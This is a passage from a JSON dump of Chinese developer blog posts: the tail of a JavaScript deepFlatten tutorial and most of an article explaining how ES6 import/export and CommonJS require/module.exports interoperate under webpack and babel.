[].concat(...arr.map(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003ev\u003c/span\u003e =\u0026gt;\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e.isArray(v) ? deepFlatten(v) : v)));\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(deepFlatten([\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, [\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e], [[\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e], \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e], \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e]));\n➜  code node deepFlatten.js\n[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e ]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e三元运算符\u003ccode\u003e(Array.isArray(v) ? deepFlatten(v) : v)\u003c/code\u003e判断\u003ccode\u003ev\u003c/code\u003e是否是一个数组，是，返回递归运用\u003ccode\u003edeepFlatten(v)\u003c/code\u003e后的值；否，直接返回\u003ccode\u003ev\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e[].concat(...arr.map(fn))\u003c/code\u003e用空数组把\u003ccode\u003emap\u003c/code\u003e运算产生的数组进行\u003ccode\u003e…\u003c/code\u003e扩展运算值拼接成结果数组返回。\u003c/p\u003e\n\u003cp\u003e该方法是深度摊平方法，在很多时候还有特定的摊平一层的需求，\u003ccode\u003eunderscore\u003c/code\u003e就有。实现的方法就是再加一个标志参数进行处理即可。具体不讲了。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e应该会写一个系列，今天先写到这，明天继续。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e个人翻译水平有限，欢迎大家在issues上批评指正。\u003ca target=\"_blank\" href=\"https://github.com/hongmaoxiao/myblog/issues/5\"\u003eJavaScript30秒， 从入门到放弃\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n","buildTime":"1514978730.0319","__v":0}
{"_id":{"$oid":"5a4cc38885472a29ac403367"},"id":"5a2e5f0851882575d42f5609","author":{"$oid":"5a4cc38785472a29ac403344"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/11/1604523294af87eb?w=1694\u0026h=336\u0026f=jpeg\u0026s=139790","https://user-gold-cdn.xitu.io/2017/12/11/16045232ed25900c?w=1380\u0026h=474\u0026f=jpeg\u0026s=143296"],"screenShot":null}],"title":"import、require、export、module.exports 混合使用详解","meta":{"likeCount":0},"tag":["前端","Webpack","NPM"],"comment":[],"shortContent":"自从使用了 es6 的模块系统后，各种地方愉快地使用 import export default，但也会在老项目中看到使用commonjs规范的 require module.exports。甚至有时候也会常常看到两者互用的场景。使用没有问题，但其中的关联与区别不得其解，使用起…","content":"\u003cblockquote\u003e\n\u003cp\u003e本文来自尚妆前端团队\u003ca target=\"_blank\" href=\"http://weibo.com/u/2115840795\"\u003e南洋\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e发表于尚妆\u003ca target=\"_blank\" href=\"https://github.com/ShowJoy-com/showjoy-blog/issues/39\"\u003egithub博客\u003c/a\u003e，欢迎订阅！\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e前言\u003c/h2\u003e\n\u003cp\u003e自从使用了 es6 的模块系统后，各种地方愉快地使用 \u003ccode\u003eimport\u003c/code\u003e \u003ccode\u003eexport default\u003c/code\u003e，但也会在老项目中看到使用commonjs规范的 \u003ccode\u003erequire\u003c/code\u003e \u003ccode\u003emodule.exports\u003c/code\u003e。甚至有时候也会常常看到两者互用的场景。使用没有问题，但其中的关联与区别不得其解，使用起来也糊里糊涂。比如：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e为何有的地方使用 \u003ccode\u003erequire\u003c/code\u003e 去引用一个模块时需要加上 \u003ccode\u003edefault\u003c/code\u003e？ \u003ccode\u003erequire('xx').default\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e经常在各大UI组件引用的文档上会看到说明 \u003ccode\u003eimport { button } from 'xx-ui'\u003c/code\u003e 这样会引入所有组件内容，需要添加额外的 babel 配置，比如 \u003ccode\u003ebabel-plugin-component\u003c/code\u003e？\u003c/li\u003e\n\u003cli\u003e为什么可以使用 es6 的 import 去引用 commonjs 规范定义的模块，或者反过来也可以又是为什么？\u003c/li\u003e\n\u003cli\u003e我们在浏览一些 npm 下载下来的 UI 组件模块时（比如说 element-ui 的 lib 文件下），看到的都是 webpack 编译好的 js 文件，可以使用 import 或 require 再去引用。但是我们平时编译好的 js 是无法再被其他模块 import 的，这是为什么？\u003c/li\u003e\n\u003cli\u003ebabel 在模块化的场景中充当了什么角色？以及 webpack ？哪个启到了关键作用？\u003c/li\u003e\n\u003cli\u003e听说 es6 还有 \u003ccode\u003etree-shaking\u003c/code\u003e 功能，怎么才能使用这个功能？\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e如果你对这些问题都了然于心，那么可以关掉本文了，如果有疑问，这篇文章就是为你准备的！\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003ewebpack 与 babel 在模块化中的作用\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003ewebpack 模块化的原理\u003c/h3\u003e\n\u003cp\u003ewebpack 本身维护了一套模块系统，这套模块系统兼容了所有前端历史进程下的模块规范，包括 \u003ccode\u003eamd\u003c/code\u003e \u003ccode\u003ecommonjs\u003c/code\u003e \u003ccode\u003ees6\u003c/code\u003e 等，本文主要针对 \u003ccode\u003ecommonjs es6\u003c/code\u003e 规范进行说明。模块化的实现其实就在最后编译的文件内。\u003c/p\u003e\n\u003cp\u003e我编写了一个 demo 更好的展示效果。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// webpack\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e path = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'path'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = {\n  \u003cspan class=\"hljs-attr\"\u003eentry\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'./a.js'\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003eoutput\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: path.resolve(__dirname, \u003cspan class=\"hljs-string\"\u003e'dist'\u003c/span\u003e),\n    \u003cspan class=\"hljs-attr\"\u003efilename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'bundle.js'\u003c/span\u003e,\n  }\n};\n\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\n\u003cspan class=\"hljs-comment\"\u003e// a.js\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e a \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./c'\u003c/span\u003e;\n\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'a.js'\u003c/span\u003e;\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(a);\n\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\n\u003cspan class=\"hljs-comment\"\u003e// c.js\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e333\u003c/span\u003e;\n\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(modules) {\n\n  \n  \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e __webpack_require__(moduleId) {\n    var module =  {\n      i: moduleId,\n      l: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n      exports: {}\n    };\n    modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e module.exports;\n  }\n\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e __webpack_require__(0);\n})([\n  (\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (module, __webpack_exports__, __webpack_require__) {\n\n    // 引用 模块 1\n    \u003cspan class=\"hljs-string\"\u003e\"use strict\"\u003c/span\u003e;\n    Object.defineProperty(__webpack_exports__, \u003cspan class=\"hljs-string\"\u003e\"__esModule\"\u003c/span\u003e, { value: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e });\n    /* harmony import */ var __WEBPACK_IMPORTED_MODULE_0__c__ = __webpack_require__(1);\n\n/* harmony default \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e */ __webpack_exports__[\u003cspan class=\"hljs-string\"\u003e\"default\"\u003c/span\u003e] = (\u003cspan class=\"hljs-string\"\u003e'a.js'\u003c/span\u003e);\nconsole.log(__WEBPACK_IMPORTED_MODULE_0__c__[\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e /* default */]);\n\n  }),\n  (\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (module, __webpack_exports__, __webpack_require__) {\n\n    // 输出本模块的数据\n    \u003cspan class=\"hljs-string\"\u003e\"use strict\"\u003c/span\u003e;\n    /* harmony default \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e */ __webpack_exports__[\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e] = (333);\n  })\n]);\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面这段 js 就是使用 webpack 编译后的代码（经过精简），其中就包含了 webpack的运行时代码，其中就是关于模块的实现。\u003c/p\u003e\n\u003cp\u003e我们再精简下代码，会发现这是个自执行函数。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(modules) {\n\n})([]);\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e自执行函数的入参是个数组，这个数组包含了所有的模块，包裹在函数中。\u003c/p\u003e\n\u003cp\u003e自执行函数体里的逻辑就是处理模块的逻辑。关键在于 \u003ccode\u003e__webpack_require__\u003c/code\u003e 函数，这个函数就是 \u003ccode\u003erequire\u003c/code\u003e 或者是 \u003ccode\u003eimport\u003c/code\u003e 的替代，我们可以看到在函数体内先定义了这个函数，然后调用了他。这里会传入一个 \u003ccode\u003emoduleId\u003c/code\u003e，这个例子中是0，也就是我们的入口模块 \u003ccode\u003ea.js\u003c/code\u003e 的内容。\u003c/p\u003e\n\u003cp\u003e我们再看 \u003ccode\u003e__webpack_require__\u003c/code\u003e 内执行了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003emodules[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e module.exports；\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e即从入参的 modules 数组中取第一个函数进行调用，并入参\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003emodule\u003c/li\u003e\n\u003cli\u003emodule.exports\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ewebpack_require\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e我们再看第一个函数（即入口模块）的逻辑（精简）：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (module, __webpack_exports__, __webpack_require__) {\n\n/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0__c__ = __webpack_require__(1);\n\n    /* harmony default \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e */ __webpack_exports__[\u003cspan class=\"hljs-string\"\u003e\"default\"\u003c/span\u003e] = (\u003cspan class=\"hljs-string\"\u003e'a.js'\u003c/span\u003e);\n    console.log(__WEBPACK_IMPORTED_MODULE_0__c__[\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e /* default */]);\n\n  }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们可以看到入口模块又调用了 \u003ccode\u003e__webpack_require__(1)\u003c/code\u003e 去引用入参数组里的第2个函数。\u003c/p\u003e\n\u003cp\u003e然后会将入参的 \u003ccode\u003e__webpack_exports__\u003c/code\u003e 对象添加 \u003ccode\u003edefault\u003c/code\u003e 属性，并赋值。\u003c/p\u003e\n\u003cp\u003e这里我们就能看到模块化的实现原理，这里的 \u003ccode\u003e__webpack_exports__\u003c/code\u003e 就是这个模块的 \u003ccode\u003emodule.exports\u003c/code\u003e 通过对象的引用传参，间接的给 module.exports 添加属性。\u003c/p\u003e\n\u003cp\u003e最后会将 module.exports return 出来。就完成了 \u003ccode\u003e__webpack_require__\u003c/code\u003e 函数的使命。\u003c/p\u003e\n\u003cp\u003e比如在入口模块中又调用了 \u003ccode\u003e__webpack_require__(1)\u003c/code\u003e，就会得到这个模块返回的 \u003ccode\u003emodule.exports\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e**但在这个自执行函数的底部，\u003ccode\u003ewebpack\u003c/code\u003e 会将入口模块的输出也进行返回 **\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e __webpack_require__(0);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e目前这种编译后的js，将入口模块的输出（即 \u003ccode\u003emodule.exports\u003c/code\u003e） 进行输出没有任何作用，只会作用于当前作用域。这个js并不能被其他模块继续以 \u003ccode\u003erequire\u003c/code\u003e 或 \u003ccode\u003eimport\u003c/code\u003e 的方式引用。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003ebabel 的作用\u003c/h3\u003e\n\u003cp\u003e按理说 webpack 的模块化方案已经很好的将es6 模块化转换成 webpack 的模块化，但是其余的 es6 语法还需要做兼容性处理。babel 专门用于处理 es6 转换 es5。当然这也包括 es6 的模块语法的转换。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e其实两者的转换思路差不多，区别在于 webpack 的原生转换 可以多做一步静态分析，使用tree-shaking 技术（下面会讲到）\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003ebabel 能提前将 es6 的 import 等模块关键字转换成 commonjs 的规范。这样 webpack 就无需再做处理，直接使用 webpack 运行时定义的 \u003ccode\u003e__webpack_require__\u003c/code\u003e 处理。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e这里就解释了 \u003cstrong\u003e问题5\u003c/strong\u003e。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003ebabel 在模块化的场景中充当了什么角色？以及 webpack ？哪个启到了关键作用？\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e那么 babel 是如何转换 es6 的模块语法呢？\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e导出模块\u003c/h4\u003e\n\u003cp\u003ees6 的导出模块写法有\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default 123;\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e const a = 123;\n\nconst b = 3;\nconst c = 4;\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e { b, c };\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ebabel 会将这些统统转换成 commonjs 的 exports。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eexports.default = 123;\nexports.a = 123;\nexports.b = 3;\nexports.c = 4;\nexports.__esModule = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ebabel 转换 es6 的模块输出逻辑非常简单，即将所有输出都赋值给 exports，并带上一个标志 \u003ccode\u003e__esModule\u003c/code\u003e 表明这是个由 es6 转换来的 commonjs 输出。\u003c/p\u003e\n\u003cp\u003ebabel将模块的导出转换为commonjs规范后，也会将引入 import 也转换为 commonjs 规范。即采用 require 去引用模块，再加以一定的处理，符合es6的使用意图。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e引入 default\u003c/h4\u003e\n\u003cp\u003e对于最常见的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport a from \u003cspan class=\"hljs-string\"\u003e'./a.js'\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在es6中 import a from './a.js' 的本意是想去引入一个 es6 模块中的 default 输出。\u003c/p\u003e\n\u003cp\u003e通过babel转换后得到 \u003ccode\u003evar a = require(./a.js)\u003c/code\u003e 得到的对象却是整个对象，肯定不是 es6 语句的本意，所以需要对 a 做些改变。\u003c/p\u003e\n\u003cp\u003e我们在导出提到，default 输出会赋值给导出对象的default属性。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eexports.default = 123;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e所以 babel 加了个 help  \u003ccode\u003e_interopRequireDefault\u003c/code\u003e 函数。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e _interopRequireDefault(obj) {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e obj \u0026amp;\u0026amp; obj.__esModule\n        ? obj\n        : { \u003cspan class=\"hljs-string\"\u003e'default'\u003c/span\u003e: obj };\n}\n\nvar _a = require(\u003cspan class=\"hljs-string\"\u003e'assert'\u003c/span\u003e);\nvar _a2 = _interopRequireDefault(_a);\n\nvar a = _a2[\u003cspan class=\"hljs-string\"\u003e'default'\u003c/span\u003e];\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e所以这里最后的 a 变量就是 require 的值的 default 属性。如果原先就是commonjs规范的模块，那么就是那个模块的导出对象。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e引入 * 通配符\u003c/h4\u003e\n\u003cp\u003e我们使用 \u003ccode\u003eimport * as a from './a.js'\u003c/code\u003e es6语法的本意是想将 es6 模块的所有命名输出以及defalut输出打包成一个对象赋值给a变量。\u003c/p\u003e\n\u003cp\u003e已知以 commonjs 规范导出：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eexports.default = 123;\nexports.a = 123;\nexports.b = 3;\nexports.__esModule = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e那么对于 es6 转换来的输出通过 \u003ccode\u003evar a = require('./a.js')\u003c/code\u003e 导入这个对象就已经符合意图。\u003c/p\u003e\n\u003cp\u003e所以直接返回这个对象。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (obj \u0026amp;\u0026amp; obj.__esModule) {\n   \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e obj;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果本来就是 commonjs 规范的模块，导出时没有default属性，需要添加一个default属性，并把整个模块对象再次赋值给default属性。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e _interopRequireWildcard(obj) {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (obj \u0026amp;\u0026amp; obj.__esModule) {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e obj;\n    }\n    \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        var newObj = {}; // (A)\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (obj != null) {\n            \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (var key \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e obj) {\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (Object.prototype.hasOwnProperty.call(obj, key))\n                    newObj[key] = obj[key];\n            }\n        }\n        newObj.default = obj;\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e newObj;\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003eimport { a } from './a.js'\u003c/h4\u003e\n\u003cp\u003e直接转换成 \u003ccode\u003erequire('./a.js').a\u003c/code\u003e 即可。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e总结\u003c/h4\u003e\n\u003cp\u003e经过上面的转换分析，我们得知即使我们使用了 es6 的模块系统，如果借助 babel 的转换，es6 的模块系统最终还是会转换成 commonjs 的规范。所以我们如果是使用 babel 转换 es6 模块，混合使用 es6 的模块和 commonjs 的规范是没有问题的，因为最终都会转换成 commonjs。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e这里解释了问题3\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e为什么可以使用 es6 的 import 去引用 commonjs 规范定义的模块，或者反过来也可以又是为什么？\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003ebabel5 \u0026amp; babel6\u003c/h3\u003e\n\u003cp\u003e我们在上文 babel 对导出模块的转换提到，es6 的 \u003ccode\u003eexport default\u003c/code\u003e 都会被转换成 \u003ccode\u003eexports.default\u003c/code\u003e，即使这个模块只有这一个输出。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e这也解释了问题1\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e为何有的地方使用 \u003ccode\u003erequire\u003c/code\u003e 去引用一个模块时需要加上 \u003ccode\u003edefault\u003c/code\u003e？ \u003ccode\u003erequire('xx').default\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e我们经常会使用 es6 的 export default 来输出模块，而且这个输出是这个模块的唯一输出，我们会误以为这种写法输出的是模块的默认输出。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// a.js\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default 123;\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// b.js 错误\n\nvar foo = require(\u003cspan class=\"hljs-string\"\u003e'./a.js'\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在使用 \u003ccode\u003erequire\u003c/code\u003e 进行引用时，我们也会误以为引入的是a文件的默认输出。\u003c/p\u003e\n\u003cp\u003e结果这里需要改成 \u003ccode\u003evar foo = require('./a.js').default\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e这个场景在写 webpack 代码分割逻辑时经常会遇到。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003erequire.ensure([], (require) =\u0026gt; {\n   callback(null, [\n     require(\u003cspan class=\"hljs-string\"\u003e'./src/pages/profitList'\u003c/span\u003e).default,\n   ]);\n });\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这是 babel6 的变更，在 babel5 的时候可不是这样的。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/11/1604523294af87eb?w=1694\u0026amp;h=336\u0026amp;f=jpeg\u0026amp;s=139790\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003ehttp://babeljs.io/docs/plugins/transform-es2015-modules-commonjs/#strict\u003c/p\u003e\n\u003cp\u003e在 babel5 时代，大部分人在用 require 去引用 es6 输出的 default，只是把 default 输出看作是一个模块的默认输出，所以 babel5 对这个逻辑做了 hack，如果一个 es6 模块只有一个 default 输出，那么在转换成 commonjs 的时候也一起赋值给 \u003ccode\u003emodule.exports\u003c/code\u003e，即整个导出对象被赋值了 default 所对应的值。\u003c/p\u003e\n\u003cp\u003e这样就不需要加 default，\u003ccode\u003erequire('./a.js')\u003c/code\u003e 的值就是想要的 default值。\u003c/p\u003e\n\u003cp\u003e但这样做是不符合 es6 的定义的，在es6 的定义里，default 只是个名字，没有任何意义。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default = 123;\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e const a = 123;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这两者含义是一样的，分别为输出名为 default 和 a 的变量。\u003c/p\u003e\n\u003cp\u003e还有一个很重要的问题，一旦 a.js 文件里又添加了一个具名的输出，那么引入方就会出麻烦。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// a.js\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default 123;\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e const a = 123; // 新增\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// b.js \n\nvar foo = require(\u003cspan class=\"hljs-string\"\u003e'./a.js'\u003c/span\u003e);\n\n// 由之前的 输出 123\n// 变成 { default: 123, a: 123 }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e所以 babel6 去掉了这个hack，这是个正确的决定，升级 babel6 后产生的不兼容问题 可以通过引入 \u003ca target=\"_blank\" href=\"https://www.npmjs.com/package/babel-plugin-add-module-exports\"\u003ebabel-plugin-add-module-exports\u003c/a\u003e 解决。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003ewebpack 编译后的js，如何再被其他模块引用\u003c/h2\u003e\n\u003cp\u003e通过 webpack 模块化原理章节给出的 webpack 配置编译后的 js 是无法被其他模块引用的，webpack 提供了 \u003ccode\u003eoutput.libraryTarget\u003c/code\u003e 配置指定构建完的 js 的用途。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e默认 var\u003c/h3\u003e\n\u003cp\u003e如果指定了 \u003ccode\u003eoutput.library = 'test'\u003c/code\u003e\n入口模块返回的 module.exports 暴露给全局 var test = returned_module_exports\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003ecommonjs\u003c/h3\u003e\n\u003cp\u003e如果library: 'spon-ui' 入口模块返回的 module.exports 赋值给 exports['spon-ui']\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003ecommonjs2\u003c/h3\u003e\n\u003cp\u003e入口模块返回的 module.exports 赋值给 module.exports\u003c/p\u003e\n\u003cp\u003e所以 element-ui 的构建方式采用 commonjs2 ，导出的组件的js 最后都会赋值给 module.exports，供其他模块引用。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/11/16045232ed25900c?w=1380\u0026amp;h=474\u0026amp;f=jpeg\u0026amp;s=143296\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e这里解释了问题4\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e我们在浏览一些 npm 下载下来的 UI 组件模块时（比如说 element-ui 的 lib 文件下），看到的都是 webpack 编译好的 js 文件，可以使用 import 或 require 再去引用。但是我们平时编译好的 js 是无法再被其他模块 import 的，这是为什么？\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e模块依赖的优化\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e按需加载的原理\u003c/h3\u003e\n\u003cp\u003e我们在使用各大 UI 组件库时都会被介绍到为了避免引入全部文件，请使用 \u003ccode\u003ebabel-plugin-component\u003c/code\u003e 等babel 插件。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport { Button, Select } from \u003cspan class=\"hljs-string\"\u003e'element-ui'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e由前文可知 import 会先转换为 commonjs， 即\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar a = require(\u003cspan class=\"hljs-string\"\u003e'element-ui'\u003c/span\u003e);\nvar Button = a.Button;\nvar Select = 